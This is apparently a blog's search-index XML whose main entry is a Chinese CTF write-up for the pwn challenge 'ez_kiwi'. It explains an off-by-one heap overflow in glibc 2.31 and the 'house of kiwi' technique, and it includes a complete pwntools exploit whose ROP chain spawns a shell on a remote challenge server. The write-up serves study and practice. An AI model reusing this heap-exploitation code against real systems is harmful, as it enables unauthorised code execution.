<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Dest0g3 520迎新赛 pwn ez_kiwi</title>
    <link href="/2022/11/01/1/"/>
    <url>/2022/11/01/1/</url>
    
    <content type="html"><![CDATA[<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>题目版本：glibc-2.31</p><p>如图在edit的过程中对重新输入的字符长度未有效检查，造成单字节溢出。</p><p><img src="/img/1/1.png"></p><p> 这时我们就可利用这一漏洞让堆块重叠，从而泄漏libc的地址</p><p>泄漏libc的地址首先想到的就是unsorted bin中的main_arena，由于存在tcache，必须释放8个大小相同才会进入unsorted bin；在add的过程中输入的idx可以小于0xf，但实际上超过9就无法正常申请，所以我们在申请释放时要小心堆块不够和top chunk的合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):          <br>    add(<span class="hljs-number">0xb0</span>, i, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">7</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)      <span class="hljs-comment">#重叠的堆块</span><br>add(<span class="hljs-number">0xb0</span>, <span class="hljs-number">9</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)      <span class="hljs-comment">#先释放进入tcache，不会top chunk的合并</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;\xc1&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    delete(i)<br>delete(<span class="hljs-number">9</span>)<br>delete(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>这时就可以得到libc的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">leak = u64( p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) )<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br></code></pre></td></tr></table></figure><p>一般情况下我们会修改tcache的fd指针，指向<code>__malloc_hook</code>和<code>__free_hook</code>,再次申请时就使用system或者one_gadget去填充该地址。但是这题故意不让你去这样去使用，每次重新开始循环时会调用clear函数将<code>__malloc_hook</code>和<code>__free_hook</code>全部重置为0。</p><img src="/img/1/2.png"  /><p><img src="/img/1/3.png"></p><h3 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h3><p>这时我们就需要使用house of kiwi这种方式，修改<code>_IO_file_sync</code>和<code>_IO_helper_jumps</code>中的值。</p><p>具体过程便是触发_<code>_malloc_asser</code>t后，去执行fflush (stderr)，会使用<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>，RDX寄存器的值为<code>IO_helper_jumps</code>指针,RDX始终是一个固定的地址。</p><img src="/img/1/5.png"><p>然后<strong>通过 setcontext 控制寄存器的值</strong>。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; disassemble setcontext<br>   <span class="hljs-number">0x00007f38b563d0dd</span> &lt;+<span class="hljs-number">61</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0xa0</span>]#利用代码<br>   <span class="hljs-number">0x00007f38b563d0e4</span> &lt;+<span class="hljs-number">68</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x80</span>]<br>   <span class="hljs-number">0x00007f38b563d0eb</span> &lt;+<span class="hljs-number">75</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x78</span>]<br>   <span class="hljs-number">0x00007f38b563d0ef</span> &lt;+<span class="hljs-number">79</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r12</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x48</span>]<br>   <span class="hljs-number">0x00007f38b563d0f3</span> &lt;+<span class="hljs-number">83</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r13</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x50</span>]<br>   <span class="hljs-number">0x00007f38b563d0f7</span> &lt;+<span class="hljs-number">87</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r14</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x58</span>]<br>   <span class="hljs-number">0x00007f38b563d0fb</span> &lt;+<span class="hljs-number">91</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r15</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x60</span>]<br>   <span class="hljs-number">0x00007f38b563d0ff</span> &lt;+<span class="hljs-number">95</span>&gt;:    <span class="hljs-keyword">test</span>   <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">fs</span>:<span class="hljs-number">0x48</span>,<span class="hljs-number">0x2</span><br>   <span class="hljs-number">0x00007f38b563d10b</span> &lt;+<span class="hljs-number">107</span>&gt;:   <span class="hljs-keyword">je</span>     <span class="hljs-number">0x7f38b563d1c6</span> &lt;setcontext+<span class="hljs-number">294</span>&gt;<br>   …………<br>   …………<br>   <span class="hljs-number">0x00007f38b563d1c6</span> &lt;+<span class="hljs-number">294</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0xa8</span>]#利用代码<br>   <span class="hljs-number">0x00007f38b563d1cd</span> &lt;+<span class="hljs-number">301</span>&gt;:   <span class="hljs-keyword">push</span>   <span class="hljs-built_in">rcx</span><br>   <span class="hljs-number">0x00007f38b563d1ce</span> &lt;+<span class="hljs-number">302</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x70</span>]<br>   <span class="hljs-number">0x00007f38b563d1d2</span> &lt;+<span class="hljs-number">306</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x68</span>]<br>   <span class="hljs-number">0x00007f38b563d1d6</span> &lt;+<span class="hljs-number">310</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x98</span>]<br>   <span class="hljs-number">0x00007f38b563d1dd</span> &lt;+<span class="hljs-number">317</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r8</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x28</span>]<br>   <span class="hljs-number">0x00007f38b563d1e1</span> &lt;+<span class="hljs-number">321</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r9</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x30</span>]<br>   <span class="hljs-number">0x00007f38b563d1e5</span> &lt;+<span class="hljs-number">325</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x88</span>]<br>   <span class="hljs-number">0x00007f38b563d1ec</span> &lt;+<span class="hljs-number">332</span>&gt;:   <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br>   <span class="hljs-number">0x00007f38b563d1ee</span> &lt;+<span class="hljs-number">334</span>&gt;:   <span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><p>设置<code>rdx + 0xa0</code>来控制rsp，也就是控制了栈的地址，通过最后的ret指令就可以执行ROP。</p><p>攻击流程如下</p><p>将<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>修改为<code>setcontext + 61</code>的地址，让程序执行setcontext中的代码；同时修改<code>_IO_helper_jumps + 0xa0 and _IO_helper_jumps + 0xa8</code>分别存放有ROP的位置和ret指令的gadget位置。题目提供了libc文件，只需在libc中找到相应的gadget再加上libc的地址即可，可以通过泄漏堆的地址来存放gadget。</p><h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><p>关于IO_helper_jumps的地址寻找：由于pwntools无法从文件直接得到IO_helper_jumps的信息，于是我们可以直接通过的libc文件利用ida中找到偏移；但如果是从pwndbg中寻找，找到的地址并不是<code>_IO_file_sync</code>中所利用的那个地址，对比下图和上图就会发现需要**-0xc0**才是我们所需要的地址。</p><p><img src="/img/1/4.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">IO_file_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>IO_helper_jumps = libcbase + <span class="hljs-number">2017632</span> - <span class="hljs-number">0xc0</span><br></code></pre></td></tr></table></figure><p> 利用0x20大小的堆块重叠，可以修改tcache中的fd指针，就可对<code>IO_file_jumps</code>的地址修改，并泄漏堆的地址。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x20, <span class="hljs-number">2</span>, b<span class="hljs-string">&#x27;a&#x27;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x20, <span class="hljs-number">3</span>, b<span class="hljs-string">&#x27;a&#x27;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">2</span>, p64(IO_file_jumps + <span class="hljs-number">0</span>x60)</span></span>+ b<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x20, <span class="hljs-number">3</span>, b<span class="hljs-string">&#x27;a&#x27;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x20, <span class="hljs-number">4</span>, p64(setcontext + <span class="hljs-number">61</span>)</span></span> + b<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x20, <span class="hljs-number">5</span>, b<span class="hljs-string">&#x27;a&#x27;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">show</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span><br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.recvuntil</span>(b<span class="hljs-string">&#x27;\n&#x27;</span>)<br>heap_addr = <span class="hljs-built_in">u64</span>(<span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.recvuntil</span>(b<span class="hljs-string">&#x27;\n&#x27;</span>)<span class="hljs-selector-attr">[-8:-2]</span><span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br></code></pre></td></tr></table></figure><p>使用ROPgadget 找到相应的gadget，利用系统调用去执行system(“&#x2F;bin&#x2F;sh”) （储存&#x2F;bin&#x2F;sh的地址自己找好偏移即可）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">ret = libcbase + <span class="hljs-number">0x25679</span><br>pop_rax = libcbase + <span class="hljs-number">0x4a550</span><br>pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c371</span><br>syscall = libcbase + <span class="hljs-number">0x2584d</span><br>rop = p64(pop_rdx_r12) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) <br>rop += p64(heap_addr + <span class="hljs-number">0x30</span>) +p64(pop_rax) + p64(<span class="hljs-number">0x3b</span>) +p64(syscall)<br></code></pre></td></tr></table></figure><p>继续利用0x20大小的堆块重叠，去修改<code>_IO_helper_jumps + 0xa0 and _IO_helper_jumps + 0xa8</code>中的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, rop)<br>edit(<span class="hljs-number">2</span>, p64(IO_helper_jumps + <span class="hljs-number">0xa0</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, p64(heap_addr -<span class="hljs-number">0x1b0</span>) + p64(ret))<br></code></pre></td></tr></table></figure><p>关于触发<code>__malloc_assert</code>：在top chunk不够使用时就使用sysmalloc，同时对top chunk进行一系列检查，这里我们不是为了绕过检查，而是故意让其不能通过检查。这里改变top chunk的大小，使其不能页对齐，并使用gift()函数申请0x25000大小的堆块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x28</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span>+ <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br>gift()<br></code></pre></td></tr></table></figure><p>完整的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;ez_kiwi&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./ez_kiwi&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27690</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;give me your name:\n&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;How much do you want?&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to put?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Tell me your idea:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to remove?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to look?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to change?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Change your idea:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gift</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;666&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(<span class="hljs-number">0xb0</span>, i, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">7</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0xb0</span>, <span class="hljs-number">9</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;\xc1&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    delete(i)<br>delete(<span class="hljs-number">9</span>)<br>delete(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">8</span>)<br><br>leak = u64( p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) )<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>IO_file_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>IO_helper_jumps = libcbase + <span class="hljs-number">2017632</span> - <span class="hljs-number">0xc0</span><br><br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">2</span>, p64(IO_file_jumps + <span class="hljs-number">0x60</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">4</span>, p64(setcontext + <span class="hljs-number">61</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[-<span class="hljs-number">8</span>:-<span class="hljs-number">2</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><br>ret = libcbase + <span class="hljs-number">0x25679</span><br>pop_rax = libcbase + <span class="hljs-number">0x4a550</span><br>pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c371</span><br>syscall = libcbase + <span class="hljs-number">0x2584d</span><br>rop = p64(pop_rdx_r12) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) <br>rop += p64(heap_addr + <span class="hljs-number">0x30</span>) +p64(pop_rax) + p64(<span class="hljs-number">0x3b</span>) +p64(syscall)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, rop)<br>edit(<span class="hljs-number">2</span>, p64(IO_helper_jumps + <span class="hljs-number">0xa0</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, p64(heap_addr -<span class="hljs-number">0x1b0</span>) + p64(ret))<br><span class="hljs-comment">#add(0x80, 9, b&#x27;a&#x27;)</span><br><br>add(<span class="hljs-number">0x28</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span>+ <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br>gift()<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/11/01/hello%20world/"/>
    <url>/2022/11/01/hello%20world/</url>
    
    <content type="html"><![CDATA[<p>Hello World</p><p><img src="/img/first.jpg"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/10/31/2022-10-31/"/>
    <url>/2022/10/31/2022-10-31/</url>
    
    <content type="html"><![CDATA[<h2 id="2022-10-31"><a href="#2022-10-31" class="headerlink" title="2022-10-31"></a>2022-10-31</h2><p><strong>Happy halloween</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
